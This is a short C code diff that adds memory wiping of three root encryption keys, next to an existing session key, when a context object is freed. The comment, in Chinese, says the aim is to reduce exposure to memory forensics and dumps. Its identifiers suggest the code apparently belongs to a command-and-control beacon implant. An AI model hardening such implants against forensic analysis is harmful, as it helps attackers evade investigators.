@@ -72,6 +72,13 @@ VOID ContextFree(BeaconContext* ctx)
     OutboxFree(&ctx->outbox);
     RuntimeGateFree(&ctx->runtime);
 
-    /* 在释放上下文之前从内存中擦除会话密钥 */
+    /* 在释放上下文之前从内存中擦除全部密钥材料：
+     * session_key（会话密钥）+ profile 中的三份根密钥字符串。
+     * 根密钥与派生密钥的防护标准应一致，存活到进程退出的明文密钥
+     * 会扩大内存取证/转储的暴露面。 */
     SecureZeroMemory(ctx->session_key, sizeof(ctx->session_key));
+    SecureZeroMemory(ctx->profile.encrypt_key, sizeof(ctx->profile.encrypt_key));
+    SecureZeroMemory(ctx->profile.http.encrypt_key, sizeof(ctx->profile.http.encrypt_key));
+    SecureZeroMemory(ctx->profile.tcp_external.encrypt_key,
+                     sizeof(ctx->profile.tcp_external.encrypt_key));
 }
